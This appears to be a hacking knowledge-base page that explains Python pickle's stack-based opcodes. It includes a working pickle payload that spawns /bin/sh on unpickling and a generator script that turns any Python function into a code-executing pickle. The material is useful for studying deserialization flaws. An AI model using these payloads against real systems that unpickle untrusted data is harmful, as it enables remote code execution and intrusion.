---
layout: kb
title:  "Pickle"
category: Hacking
---

Python includes a serialization library called `pickle` to write /
read Python objects. It uses a stack based language for the interpreter.

| Instruction | Description |
| ----------- | ----------- |
| `c` | Read to the newline as the module name; read the next line as the module object; push `module.object` onto the stack |
| `(` | Push a MARK object onto the stack |
| `S` | Push trailing string in quotes onto the stack |
| `V` | Push trailing unicode string in quotes onto the stack |
| `l` | Pop everything off the stack until MARK into a list; push the list back onto the stack |
| `t` | Pop everything off the stack until MARK into a tuple; push the tuple back onto the stack |
| `R` | Pop two objects off the stack (argument and callable); apply the function to the arguments; push the result back onto the stack |
| `p` | Read to the newline as the `index`; peek at the top stack object and store it in memo `index` |
| `g` | Read to the newline as the `index`; grab an object from memo `index` and push onto the stack |
| `0` | Pop and discard the topmost stack item |
| `.` | End of the pickle |

## Arbitrary Code Execution
The following will spawn `/bin/sh` when unpickled and is equivalent to:

```python
import os
os.system('/bin/sh')
```

```
cos
system
(S'/bin/sh'
tR.
```

Below is a Python program that allows you to write a payload in Python
that will get executed when unpickled. [Source](https://checkoway.net/musings/pickle/)

```python
import marshal
import base64

# payload() will be executed when unpickled
def payload():
    pass

print("""ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'%s'
tRtRc__builtin__
globals
(tRS''
tR(tR.""" % base64.b64encode(marshal.dumps(payload.__code__)).decode())
```
